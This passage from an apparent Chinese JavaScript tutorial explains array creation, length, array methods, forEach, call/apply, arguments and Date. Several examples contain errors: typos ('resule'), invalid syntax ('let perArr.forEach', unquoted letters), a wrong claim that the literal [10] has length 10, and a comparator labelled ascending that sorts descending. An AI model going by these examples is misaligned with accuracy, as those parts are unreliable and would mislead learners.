function_">log</span>(arr[<span class="number">1</span>]); <span class="comment">//456</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">2</span>]); <span class="comment">//789</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">3</span>]); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure></li><li>数组长度(length)<br>使用<code>length</code>属性获取数组的<code>长度(元素的个数)</code><br>语法： <code>数组.length</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">123</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="number">456</span>;</span><br><span class="line">arr[<span class="number">2</span>] = <span class="number">789</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr.<span class="property">length</span>); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>对<code>非连续</code>的<code>数组</code>，使用<code>length</code>会获取到<code>最大索引+1</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">123</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="number">456</span>;</span><br><span class="line">arr[<span class="number">2</span>] = <span class="number">789</span>;</span><br><span class="line">arr[<span class="number">10</span>] = <span class="number">789</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr.<span class="property">length</span>); <span class="comment">// 11</span></span><br></pre></td></tr></table></figure></li><li>修改length<br><code>length 大于</code>原长度，则<code>多出部分</code>会<code>空出来</code><br><code>length 小于</code>原长度，则<code>多出部分</code>会<code>被删除</code></li><li>向数组的最后一个位置添加元素<br>语法： <code>数组[数组.length] = 值</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">123</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="number">456</span>;</span><br><span class="line">arr[<span class="number">2</span>] = <span class="number">789</span>;</span><br><span class="line">arr[arr.<span class="property">length</span>]=<span class="number">10</span>;</span><br><span class="line">arr[arr.<span class="property">length</span>]=<span class="number">20</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">3</span>]); <span class="comment">// 10</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">4</span>]); <span class="comment">// 20</span></span><br></pre></td></tr></table></figure></li><li>创建时添加元素<ul><li>构造函数创建<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">0</span>],arr[<span class="number">1</span>],arr[<span class="number">2</span>],arr.<span class="property">length</span>); <span class="comment">//10 20 30 3</span></span><br></pre></td></tr></table></figure></li><li>字面量创建<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">0</span>],arr[<span class="number">1</span>],arr[<span class="number">2</span>],arr.<span class="property">length</span>); <span class="comment">//10 20 30 3</span></span><br></pre></td></tr></table></figure></li></ul></li><li>创建只添加一个元素，即数组长度<ul><li>构造函数创建<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">0</span>],arr[<span class="number">1</span>],arr[<span class="number">2</span>],arr.<span class="property">length</span>); <span class="comment">//undefined undefined undefined 10</span></span><br></pre></td></tr></table></figure></li><li>字面量创建<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">10</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">0</span>],arr[<span class="number">1</span>],arr[<span class="number">2</span>],arr.<span class="property">length</span>); <span class="comment">//undefined undefined undefined 10</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="数组的方法"><a href="#数组的方法" class="headerlink" title="数组的方法"></a>数组的方法</h2><h3 id="push"><a href="#push" class="headerlink" title="push()"></a>push()</h3><p>向数组的<code>末尾</code>添加<code>一个</code>或<code>多个</code>元素，并把数组的<code>新长度</code>作为<code>返回值</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>];</span><br><span class="line">arr.<span class="title function_">push</span>(<span class="number">40</span>,<span class="number">50</span>,<span class="number">60</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr); <span class="comment">// 10,20,30,40,50,60</span></span><br><span class="line"><span class="keyword">let</span> result = arr.<span class="title function_">push</span>(<span class="number">70</span>,<span class="number">80</span>,<span class="number">90</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(resule); <span class="comment">// 9</span></span><br></pre></td></tr></table></figure><h3 id="pop"><a href="#pop" class="headerlink" title="pop()"></a>pop()</h3><p><code>删除</code>数组<code>最后一个元素</code>，并把<code>删除的元素</code>作为<code>返回值</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>];</span><br><span class="line">arr.<span class="title function_">pop</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr); <span class="comment">// 10,20</span></span><br><span class="line"><span class="keyword">let</span> result = arr.<span class="title function_">pop</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(resule); <span class="comment">// 20</span></span><br></pre></td></tr></table></figure><h3 id="unshift"><a href="#unshift" class="headerlink" title="unshift()"></a>unshift()</h3><p>向数组的<code>开头</code>添加<code>一个</code>或<code>多个</code>元素，并把数组的<code>新长度</code>作为<code>返回值</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>];</span><br><span class="line">arr.<span class="title function_">unshift</span>(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr); <span class="comment">// 4,5,6,10,20,30</span></span><br><span class="line"><span class="keyword">let</span> result = arr.<span class="title function_">unshift</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(resule); <span class="comment">// 9</span></span><br></pre></td></tr></table></figure><h3 id="shift"><a href="#shift" class="headerlink" title="shift()"></a>shift()</h3><p><code>删除</code>数组<code>开头一个</code>元素，并把<code>删除的元素</code>作为<code>返回值</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>];</span><br><span class="line">arr.<span class="title function_">shift</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr); <span class="comment">// 20,30</span></span><br><span class="line"><span class="keyword">let</span> result = arr.<span class="title function_">shift</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(resule); <span class="comment">// 20</span></span><br></pre></td></tr></table></figure><h3 id="slice"><a href="#slice" class="headerlink" title="slice()"></a>slice()</h3><p><code>提取``数组``指定</code>的<code>元素</code>，<code>不影响原数组</code>，将截取到的元素封装到一个<code>新数组</code>中<code>返回</code></p><ul><li>参数：<ul><li>1.截取开始位置的索引，<code>包含</code>开始的索引</li><li>2.截取结束位置的索引，<code>不包含</code>结束的索引<ul><li><code>第二个参数</code>可以<code>省略不写</code>,此时会截取<code>从开始索引往后的所有元素</code></li><li><code>第二个参数</code>是<code>负值</code>则<code>从最后往前算</code><ul><li><code>-1</code> 则是 <code>倒数第一个</code></li><li><code>-2</code> 则是 <code>倒数第二个</code></li></ul></li></ul></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> perArr = [<span class="string">&quot;孙悟空&quot;</span>,<span class="string">&quot;红孩儿&quot;</span>,<span class="string">&quot;猪八戒&quot;</span>,<span class="string">&quot;二郎神&quot;</span>,<span class="string">&quot;唐三藏&quot;</span>,<span class="string">&quot;沙悟净&quot;</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( perArr.<span class="title function_">slice</span>(<span class="number">1</span>, <span class="number">4</span>) ); <span class="comment">//  红孩儿 猪八戒 二郎神</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> perArr = [<span class="string">&quot;孙悟空&quot;</span>,<span class="string">&quot;红孩儿&quot;</span>,<span class="string">&quot;猪八戒&quot;</span>,<span class="string">&quot;二郎神&quot;</span>,<span class="string">&quot;唐三藏&quot;</span>,<span class="string">&quot;沙悟净&quot;</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( perArr.<span class="title function_">slice</span>(<span class="number">2</span>) ); <span class="comment">// 猪八戒 二郎神 唐三藏 沙悟净</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> perArr = [<span class="string">&quot;孙悟空&quot;</span>,<span class="string">&quot;红孩儿&quot;</span>,<span class="string">&quot;猪八戒&quot;</span>,<span class="string">&quot;二郎神&quot;</span>,<span class="string">&quot;唐三藏&quot;</span>,<span class="string">&quot;沙悟净&quot;</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( perArr.<span class="title function_">slice</span>(<span class="number">1</span>,-<span class="number">2</span>) ); <span class="comment">// 红孩儿 猪八戒 二郎神</span></span><br></pre></td></tr></table></figure><h3 id="splice"><a href="#splice" class="headerlink" title="splice()"></a>splice()</h3><p><code>删除</code>数组<code>指定</code>的元素，会<code>影响原数组</code>, 将<code>被删除的元素</code>作为<code>返回值</code>返回</p><ul><li>参数： <ul><li>第一个，表示开始位置的索引，<code>包含</code>开始的索引</li><li>第二个, 表示<code>删除的数量</code></li><li>第三个及以后，可以传递<code>新的元素</code>，这些元素将会自动插入到开始位置索引前边</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> perArr = [<span class="string">&quot;孙悟空&quot;</span>,<span class="string">&quot;红孩儿&quot;</span>,<span class="string">&quot;猪八戒&quot;</span>,<span class="string">&quot;二郎神&quot;</span>,<span class="string">&quot;唐三藏&quot;</span>,<span class="string">&quot;沙悟净&quot;</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( perArr.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">4</span>) ); <span class="comment">//  红孩儿 猪八戒 二郎神 唐三藏</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( perArr ); <span class="comment">// 孙悟空 沙悟净</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( perArr.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">0</span>,<span class="string">&quot;红孩儿&quot;</span>,<span class="string">&quot;猪八戒&quot;</span>,<span class="string">&quot;二郎神&quot;</span>,<span class="string">&quot;唐三藏&quot;</span>) ); <span class="comment">//  红孩儿 猪八戒 二郎神 唐三藏</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( perArr ); <span class="comment">// 孙悟空 红孩儿 猪八戒 二郎神 唐三藏 沙悟净</span></span><br></pre></td></tr></table></figure><h3 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h3><p>连接<code>两个</code>或<code>多个数组</code>或<code>元素</code>，并将<code>新的数组返回</code>，<code>不会影响原数组</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> perArr1 = [<span class="string">&quot;孙悟空&quot;</span>,<span class="string">&quot;红孩儿&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> perArr2 = [<span class="string">&quot;宋江&quot;</span>,<span class="string">&quot;李逵&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> perArr4 = perArr1.<span class="title function_">concat</span>(perArr2,<span class="string">&quot;林黛玉&quot;</span>,<span class="string">&quot;包青天&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(perArr4); <span class="comment">// 孙悟空 红孩儿 宋江 李逵 林黛玉 包青天</span></span><br></pre></td></tr></table></figure><h3 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h3><p>将<code>数组</code>转换成一个<code>字符串</code>,<code>不会影响原数组</code>，<code>返回字符串</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> perArr1 = [<span class="string">&quot;孙悟空&quot;</span>,<span class="string">&quot;红孩儿&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> perArr2 = perArr1.<span class="title function_">join</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(perArr2); <span class="comment">//孙悟空,红孩儿</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> perArr2); <span class="comment">//string</span></span><br></pre></td></tr></table></figure><p>实参默认为<code>逗号(，)</code>，可进行更改</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> perArr1 = [<span class="string">&quot;孙悟空&quot;</span>,<span class="string">&quot;红孩儿&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> perArr2 = perArr1.<span class="title function_">join</span>(<span class="string">&quot;-我是实参-&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(perArr2); <span class="comment">//孙悟空-我是实参-红孩儿</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> perArr2); <span class="comment">//string</span></span><br></pre></td></tr></table></figure><h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse()"></a>reverse()</h3><p><code>颠倒</code> <code>原数组</code>，<code>影响原数组</code>，返回<code>颠倒后的数组</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> perArr1 = [<span class="string">&quot;孙悟空&quot;</span>,<span class="string">&quot;沙悟净&quot;</span>,<span class="string">&quot;猪八戒&quot;</span>,<span class="string">&quot;唐三藏&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> perArr2 = perArr1.<span class="title function_">reverse</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(perArr2); <span class="comment">// [ &#x27;唐三藏&#x27;, &#x27;猪八戒&#x27;, &#x27;沙悟净&#x27;, &#x27;孙悟空&#x27; ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(perArr1); <span class="comment">// [ &#x27;唐三藏&#x27;, &#x27;猪八戒&#x27;, &#x27;沙悟净&#x27;, &#x27;孙悟空&#x27; ]</span></span><br></pre></td></tr></table></figure><h3 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h3><p>对数组的元素进行<code>排序</code>，<code>影响原数组</code>，返回<code>排序后的数组</code><br>默认对 <code>Unicode</code> 编码进行排序</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str1 = [e,c,b,f,a,d];</span><br><span class="line"><span class="keyword">let</span> str2 = str1.<span class="title function_">sort</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str2); <span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27; ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str1); <span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27; ]</span></span><br></pre></td></tr></table></figure><p>对数字的排序也是按照 <code>Unicode</code> 排序</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">11</span>];</span><br><span class="line">str1.<span class="title function_">sort</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str1); <span class="comment">// [ 1, 11, 2, 4, 5, 8 ]</span></span><br></pre></td></tr></table></figure><p>所以可以在sort()添加<code>回调函数</code>，来<code>指定排序规则</code><br>回调函数中需要定义<code>两个形参</code>,<br>浏览器将会分别使用数组中的元素作为实参去调用回调函数<br><code>第一个形参</code>数所代表的<code>实参</code>始终在<code>第二个形参</code>代表的<code>实参</code>的<code>后面</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str1 = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>];</span><br><span class="line">str1.<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 3,2</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 1,3</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>浏览器会根据回调函数的<code>返回值</code>来决定<code>元素</code>的<code>顺序</code>，<br>如果返回一个<code>大于0</code>的值，则元素会<code>交换位置</code><br>如果返回一个<code>小于0</code>的值，则元素<code>位置不变</code><br>如果返回一个<code>0</code>，则认为<code>两个元素相等</code>，也不交换位置<br>如果需要<code>升序</code>排列，则返回<code>a-b</code><br>如果需要<code>降序</code>排列，则返回<code>b-a</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str1 = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">10</span>];</span><br><span class="line">str1.<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a &lt; b )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;); <span class="comment">// 升序</span></span><br><span class="line">str1.<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> a - b <span class="comment">// 升序</span></span><br><span class="line">  <span class="keyword">return</span> b - a <span class="comment">// 降序</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str1); <span class="comment">// [ 0, 1, 2, 3, 4, 5,  6, 7, 8, 9, 10, 11 ]</span></span><br></pre></td></tr></table></figure><hr><h2 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h2><h3 id="运用for循环"><a href="#运用for循环" class="headerlink" title="运用for循环"></a>运用for循环</h3><p>遍历数组就是把数组的<code>所有元素</code>都取出来</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; arr.<span class="property">length</span> ; i++)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[i]); <span class="comment">// 10 20 30</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach()"></a>forEach()</h3><p><code>ie8</code>以上支持<br><code>forEach()</code> 方法需要一个<code>函数</code>作参数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> perArr = [<span class="string">&quot;孙悟空&quot;</span>,<span class="string">&quot;红孩儿&quot;</span>,<span class="string">&quot;猪八戒&quot;</span>,<span class="string">&quot;二郎神&quot;</span>,<span class="string">&quot;唐三藏&quot;</span>,<span class="string">&quot;沙悟净&quot;</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span> ()&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我有多少个&quot;</span>); <span class="comment">// 执行6遍，因为有perArr 有6个元素</span></span><br><span class="line">&#125;</span><br><span class="line">perArr.<span class="title function_">forEach</span>(fun);</span><br></pre></td></tr></table></figure><p>但一般直接写函数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> perArr.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我有多少个&quot;</span>); <span class="comment">// 执行6遍，因为有perArr 有6个元素</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>而这种函数是由开发人员<code>创建</code>，但却不是由开发人员<code>调用</code>的，称为<code>回调函数</code><br>并且数组中有几个元素，该函数就执行多少遍<br>如果有添加上<code>形参</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> perArr = [<span class="string">&quot;孙悟空&quot;</span>,<span class="string">&quot;红孩儿&quot;</span>,<span class="string">&quot;猪八戒&quot;</span>,<span class="string">&quot;二郎神&quot;</span>,<span class="string">&quot;唐三藏&quot;</span>,<span class="string">&quot;沙悟净&quot;</span>];</span><br><span class="line">perArr.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">value,index,object</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">// 遍历的元素 // 孙悟空 红孩儿 猪八戒 二郎神 唐三藏 沙悟净</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(index); <span class="comment">// 遍历元素的索引（下标） // 0 1 2 3 4 5 </span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(object); <span class="comment">// 正在遍历的数组对象</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><hr><h1 id="函数的方法"><a href="#函数的方法" class="headerlink" title="函数的方法"></a>函数的方法</h1><h2 id="call-和apply"><a href="#call-和apply" class="headerlink" title="call()和apply()"></a>call()和apply()</h2><p><code>call()</code>和<code>apply()</code>用来改变<code>this</code>的指向</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;<span class="attr">name</span>:<span class="string">&quot;1&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;<span class="attr">name</span>:<span class="string">&quot;2&quot;</span>&#125;;</span><br><span class="line"><span class="title function_">fun</span>();<span class="comment">// undefined</span></span><br><span class="line">fun.<span class="title function_">call</span>(obj1); <span class="comment">// &#123; name: &#x27;1&#x27; &#125; 也就是obj1</span></span><br><span class="line">fun.<span class="title function_">apply</span>(obj1); <span class="comment">// &#123; name: &#x27;1&#x27; &#125; 也就是obj1</span></span><br><span class="line">fun.<span class="title function_">call</span>(obj2); <span class="comment">// &#123; name: &#x27;2&#x27; &#125; 也就是obj2</span></span><br><span class="line">fun.<span class="title function_">apply</span>(obj2); <span class="comment">// &#123; name: &#x27;2&#x27; &#125; 也就是obj2</span></span><br></pre></td></tr></table></figure><p><code>call()</code>和<code>apply()</code>的区别在于所传的<code>实参类型</code><br><code>call()</code>是<code>一个一个</code>实参传递到形参，和普通传递一样；<br><code>apply()</code>是一个<code>整体数组</code>实参传递到形参，实参也得加上中括号<code>（[]）</code>；</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;obj1&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">fun.<span class="title function_">call</span>(obj1,<span class="number">1</span>,<span class="number">2</span>); <span class="comment">//obj1, 1, 2</span></span><br><span class="line">fun.<span class="title function_">apply</span>(obj1,[<span class="number">1</span>,<span class="number">2</span>]); <span class="comment">//obj1, 1, 2</span></span><br></pre></td></tr></table></figure><h2 id="arguments"><a href="#arguments" class="headerlink" title="arguments"></a>arguments</h2><ul><li>在调用函数时，浏览器每次都会传递进两个隐含的参数：<ul><li>函数的上下文对象 this</li><li>封装实参的对象 arguments<ul><li>arguments是一个类数组对象,它也可以通过索引来操作数据，也可以获取长度</li><li>在调用函数时，我们所传递的实参都会在arguments中保存</li><li>arguments.length可以用来获取实参的长度</li><li>我们即使不定义形参，也可以通过arguments来使用实参， 只不过比较麻烦<ul><li>arguments[0] 表示第一个实参</li><li>[1] 表示第二个实参 。。。</li></ul></li><li>它里边有一个属性叫做callee，<ul><li>这个属性对应一个函数对象，就是当前正在指向的函数的对象<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">  <span class="comment">//console.log(arguments instanceof Array);</span></span><br><span class="line">  <span class="comment">//console.log(Array.isArray(arguments));</span></span><br><span class="line">  <span class="comment">//console.log(arguments[1]);</span></span><br><span class="line">  <span class="comment">//console.log(arguments.length);</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>.<span class="property">callee</span> == fun);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fun</span>(<span class="string">&quot;hello&quot;</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul></li></ul><hr><h1 id="Date对象"><a href="#Date对象" class="headerlink" title="Date对象"></a>Date对象</h1><ul><li>在JS中使用Date对象来表示一个时间<ul><li>new Date()</li></ul></li><li>getDate()<ul><li>获取当前日期对象是几日</li></ul></li><li>getDay()<ul><li>获取当前日期对象时周几</li><li>会返回一个0-6的值，0 表示周日 、1表示周一</li></ul></li><li>getMonth()<ul><li>获取当前时间对象的月份</li><li>会返回一个0-11的值, 0 表示1月、11 表示12月</li></ul></li><li>getFullYear()<ul><li>获取当前日期对象的年份</li></ul></li><li>getTime()<ul><li>获取当前日期对象的时间戳</li><li>时间戳，指的是从格林威治标准时间的1970年1月1日，0时0分0秒，到当前日期所花费的毫秒数（1秒 = 1000毫秒）</li><li>计算机底层在保存时间时使用都是时间戳</li></ul></li><li>Date.now()<ul><li>利用时间戳来测试代码的执行的性能</li><li>获取当前的时间戳</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个Date对象</span></span><br><span class="line"><span class="comment">//如果直接使用构造函数创建一个Date对象，则会封装为当前代码执行的时间</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个指定的时间对象</span></span><br><span class="line"><span class="comment">//需要在构造函数中传递一个表示时间的字符串作为参数</span></span><br><span class="line"><span class="comment">//日期的格式  月份/日/年 时:分:秒</span></span><br><span class="line"><span class="keyword">var</span> d2 = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;2/18/2011 11:10:30&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * getDate()</span></span><br><span class="line"><span class="comment"> * - 获取当前日期对象是几日</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> date = d2.<span class="title function_">getDate</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * getDay()</span></span><br><span class="line"><span class="comment"> * - 获取当前日期对象时周几</span></span><br><span class="line"><span class="comment"> * - 会返回一个0-6的值</span></span><br><span class="line"><span class="comment"> * 0 表示周日</span></span><br><span class="line"><span class="comment"> * 1表示周一</span></span><br><span class="line"><span class="comment"> * 。。。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> day = d2.<span class="title function_">getDay</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * getMonth()</span></span><br><span class="line"><span class="comment"> * d2 = new Date(&quot;12/18/2011 11:10:30&quot;);</span></span><br><span class="line"><span class="comment"> * - 